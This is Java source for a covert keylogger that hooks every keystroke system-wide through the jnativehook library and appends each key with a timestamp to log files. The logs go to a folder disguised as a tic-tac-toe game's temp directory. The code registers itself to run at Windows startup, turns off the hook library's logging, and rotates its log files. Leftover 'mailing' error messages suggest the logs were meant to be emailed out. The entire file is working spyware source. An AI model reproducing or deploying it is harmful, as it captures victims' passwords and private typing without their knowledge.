package Logging;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Calendar;
import java.util.Date;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyboardLogger implements NativeKeyListener{
	static String line="";
	static Calendar calendar;
	static String date;

	final static String logFolderPath="c:\\tickTackToeTempFile\\";
	public static String logFilePath=logFolderPath+"log";
	static OutputStream outputStream;
	public static File logFile;
	private static byte[] configDataBytes;

	//	SendMail mail;
	public static void keylogger() {
		// TODO Auto-generated method stub
		if(!new File(logFolderPath).exists()){
			//			new File("E:\\windows_sys").mkdir();
			new File(logFolderPath).mkdir();

		}
		
		calendar=Calendar.getInstance();
		date=((calendar.getTime().toString()).replace(' ','_')).replace(':', '-');
		logFilePath+=" "+date+".txt";
		logFile= new File(logFilePath);
		String configData= WinRegistry.setOnStartup();
		configData += "\n"+ System.getProperty("OS")+ "\n";
		byte [] configDataBytes_local= configData.getBytes();
		configDataBytes=configDataBytes_local;
		try {
			outputStream= Files.newOutputStream(Paths.get(logFilePath),StandardOpenOption.CREATE,
					StandardOpenOption.APPEND);
			outputStream.write(configDataBytes);
			outputStream.flush();
//			outputStream.close();

		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		setLoggingOff();
		registerKeyListener();

	}

	private static void registerKeyListener() {
		// TODO Auto-generated method stub
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(new KeyboardLogger());
	}

	private static void setLoggingOff() {
		// TODO Auto-generated method stub
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);

		// Change the level for all handlers attached to the default logger.
		Handler[] handlers = Logger.getLogger("").getHandlers();
		for (int i = 0; i < handlers.length; i++) {
			handlers[i].setLevel(Level.OFF);
		}
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		Date currentDate= Calendar.getInstance().getTime();
		try {

			line=currentDate+"\t"+ NativeKeyEvent.getKeyText(e.getKeyCode())+"\n";
			byte[] lines_byte= line.getBytes();
			outputStream.write(lines_byte);
			outputStream.flush();
//			outputStream.close();
		}			
		catch (IOException e1) {
			// TODO Auto-generated catch block
			System.out.println("IOException caught while mailing: "+e1.getMessage());
			e1.printStackTrace();
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			System.out.println("Exception caught while mailing: "+e1.getMessage());
			e1.printStackTrace();
		}
	}


	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub

		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
	}

//	

	public static void eraseLog() {
		//		 TODO Auto-generated method stub
		try {
			Thread.sleep(30);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		logFile.delete();
		System.out.println("LOG File deleted");
		regenerateLogFile();
	}

	private static void regenerateLogFile() {
		// TODO Auto-generated method stub
		date=((Calendar.getInstance().getTime().toString()).replace(' ', '_')).replace(':', '-');
		
		logFilePath= logFolderPath+"log "
				+ date+".txt";
		logFile= null;
		logFile= new File(logFilePath);
		try {
			outputStream.close();
			outputStream= Files.newOutputStream(Paths.get(logFilePath),StandardOpenOption.CREATE,
					StandardOpenOption.APPEND);
			outputStream.write(configDataBytes);
			outputStream.flush();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
		
		System.out.println(date + " regenerating log file: "+ logFile.getName());
	}

		public static void closeOutputStream() {
			// TODO Auto-generated method stub
			try {
				
				outputStream.flush();
				outputStream.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
		}
//	public final static void clearConsole()
//	{
//		try
//		{
//			final String os = System.getProperty("os.name");
//
//			if (os.contains("Windows"))
//			{
//				Runtime.getRuntime().exec("cls");
//			}
//			else
//			{
//				Runtime.getRuntime().exec("clear");
//			}
//		}
//		catch (final Exception e)
//		{
//			System.err.println("exception caught: "+e.getMessage());
//			//  Handle any exceptions.
//		}
//	}

}
